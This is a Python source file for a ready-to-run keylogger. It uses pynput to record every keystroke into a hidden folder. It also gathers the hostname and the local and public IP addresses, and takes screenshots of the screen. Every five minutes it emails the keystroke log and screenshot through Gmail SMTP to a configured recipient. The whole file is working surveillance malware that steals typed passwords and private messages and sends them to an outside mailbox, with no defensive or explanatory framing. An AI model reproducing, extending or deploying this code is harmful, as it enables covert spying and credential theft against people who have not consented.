# advanced_keylogger.py
from pynput import keyboard
import logging
from datetime import datetime
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket
import requests
from PIL import ImageGrab
import platform
import time
from email_config import EMAIL_ADDRESS, EMAIL_PASSWORD, TO_EMAIL

# === Setup ===
log_dir = ".keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = f"{log_dir}/log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
screenshot_file = f"{log_dir}/screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === Collect System Info ===
def get_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        public_ip = requests.get('https://api.ipify.org').text
        os_info = platform.platform()
        with open(log_file, 'a') as f:
            f.write(f"\n[System Info]\nHostname: {hostname}\nLocal IP: {ip_address}\nPublic IP: {public_ip}\nOS: {os_info}\n\n")
    except Exception as e:
        logging.info(f"Could not get system info: {e}")

# === Take Screenshot ===
def take_screenshot():
    img = ImageGrab.grab()
    img.save(screenshot_file)

# === Send Email ===
def send_email():
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = 'Advanced Keylogger Report'

    with open(log_file, 'r') as f:
        body = f.read()
    msg.attach(MIMEText(body, 'plain'))

    # Attach screenshot
    try:
        with open(screenshot_file, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(screenshot_file)}')
            msg.attach(part)
    except:
        pass

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# === Schedule Email Sending ===
def schedule_email():
    take_screenshot()
    send_email()
    threading.Timer(300, schedule_email).start()

# === Keylogger Function ===
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special Key: {key}")

# === Main ===
get_system_info()
schedule_email()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
